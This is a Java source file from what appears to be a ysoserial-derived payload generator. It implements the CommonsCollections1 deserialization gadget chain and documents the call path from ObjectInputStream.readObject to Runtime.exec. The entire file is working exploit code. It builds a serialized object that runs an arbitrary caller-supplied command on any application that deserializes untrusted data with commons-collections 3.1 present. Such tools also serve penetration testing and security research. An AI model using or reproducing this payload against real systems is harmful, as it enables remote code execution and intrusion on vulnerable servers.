package org.su18.ysuserial.payloads.gadgets;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.JavaVersion;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.TransformerUtil;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{new ConstantTransformer(1)});
		// real chain for after setup
		final Transformer[] transformers = TransformerUtil.makeTransformer(command);

		final Map               innerMap = new HashMap();
		final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
		final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAnnInvHUniversalMethodImpl();
	}
}
